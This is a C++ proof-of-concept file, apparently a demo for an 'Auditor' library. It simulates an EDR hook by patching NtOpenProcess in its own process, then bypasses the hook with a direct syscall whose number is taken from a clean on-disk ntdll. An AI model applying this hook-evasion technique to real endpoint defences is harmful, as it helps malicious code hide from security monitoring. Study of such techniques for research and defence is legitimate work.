#include <iostream>
#include <windows.h>
#include <winternl.h>

//ntdll 순정과 ntdll 오염을 비교합니다.
import Auditor.Core;
import Auditor.PE;
import Auditor.Syscall;

#pragma execution_character_set("utf-8")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// [자가 후킹 함수] 호출되면 무조건 실패 코드를 뱉게 만드는 EDR 역할 플레이
void DestroyFunction(void* targetAddr) {
    DWORD oldProtect;
    VirtualProtect(targetAddr, 6, PAGE_EXECUTE_READWRITE, &oldProtect);

    unsigned char* opcodes = (unsigned char*)targetAddr;
    opcodes[0] = 0xB8; 
    opcodes[1] = 0x22;
    opcodes[2] = 0x00;
    opcodes[3] = 0x00;
    opcodes[4] = 0xC0;
    opcodes[5] = 0xC3; 

    VirtualProtect(targetAddr, 6, oldProtect, &oldProtect);
}

int main() {
    SetConsoleOutputCP(65001);
    std::cout << "[*] --- EDR Bypass Proof of Concept (PoC) ---\n\n";

    Auditor::UnhookEngine engine;
    if (!engine.IsReady()) {
        std::cerr << "[!] Failed to initialize UnhookEngine. Disk ntdll.dll mapping failed.\n";
        return 1;
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    void* localNtOpenProcess = (void*)GetProcAddress(hNtdll, "NtOpenProcess");

    std::cout << "[1] Normal State: Calling standard Windows API...\n";
    HANDLE hTest1 = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
    std::cout << "    -> Result: " << (hTest1 ? "SUCCESS" : "FAILED") << " (Handle: " << hTest1 << ")\n\n";
    if (hTest1) CloseHandle(hTest1);

    std::cout << "[!] Activating Mock EDR Hook (Corrupting local NtOpenProcess in memory)... \n";
    DestroyFunction(localNtOpenProcess);
    std::cout << "[!] Hook Injected successfully.\n\n";

    std::cout << "[2] Test A: Calling standard API after EDR Hook...\n";
    HANDLE hTest2 = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
    std::cout << "    -> Result: " << (hTest2 ? "SUCCESS" : "FAILED") << " (Handle: " << hTest2 << ")\n";
    std::cout << "    (Standard API failed because the local ntdll function was corrupted.)\n\n";

    std::cout << "[3] Test B: Executing Direct Syscall (v0.3.0 Engine)...\n";

    void* cleanNtdllBase = engine.GetCleanBaseAddress();
    void* cleanNtOpenProcess = Auditor::PE::GetFunctionAddressFromEAT(cleanNtdllBase, "NtOpenProcess");
    WORD ssn = Auditor::Syscall::GetSyscallNumber(cleanNtOpenProcess);

    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr = { 0 };
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
    CLIENT_ID clientId = { 0 };
    clientId.UniqueProcess = (HANDLE)static_cast<DWORD_PTR>(GetCurrentProcessId());

    NTSTATUS status = Auditor::Syscall::DirectSyscallInvoke(ssn, &hProcess, PROCESS_QUERY_INFORMATION, &objAttr, &clientId);

    if (NT_SUCCESS(status) && hProcess != NULL) {
        std::cout << "    -> Result: [+++++] ATTACK SUCCESS! [+++++]\n";
        std::cout << "    -> Spawned Handle: 0x" << std::hex << hProcess << "\n";
        std::cout << "    (Bypassed successfully even though local NtOpenProcess was corrupted!)\n";
        CloseHandle(hProcess);
    }
    else {
        std::cout << "    -> Result: FAILED (Status: 0x" << std::hex << status << ")\n";
    }

    return 0;
}